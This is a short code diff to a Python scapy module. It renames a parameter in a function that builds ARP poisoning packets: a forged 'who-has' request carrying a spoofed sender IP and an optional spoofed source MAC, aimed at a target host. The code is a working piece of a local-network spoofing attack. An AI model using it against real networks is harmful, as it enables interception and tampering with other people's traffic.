@@ -4,7 +4,7 @@ from scapy.layers.l2 import ARP, Ether, Packet
 
 
 def create_arppoison_packet(
-    target_mac: str, target_ip: str, spoofed_ip: str, attacker_mac: str | None = None
+    target_mac: str, target_ip: str, spoofed_ip: str, spoofed_mac: str | None = None
 ) -> Packet:
     """Create ARP packet.
 
@@ -14,7 +14,7 @@ def create_arppoison_packet(
         spoofed_ip (str): IP address of the spoofed IP address
     Returns:
         Ether: ARP packet"""
-    ether_opts: dict = {"src": attacker_mac} if attacker_mac else {}
+    ether_opts: dict = {"src": spoofed_mac} if spoofed_mac else {}
     return Ether(dst=target_mac, **ether_opts) / ARP(
         op="who-has", psrc=spoofed_ip, pdst=target_ip
     )
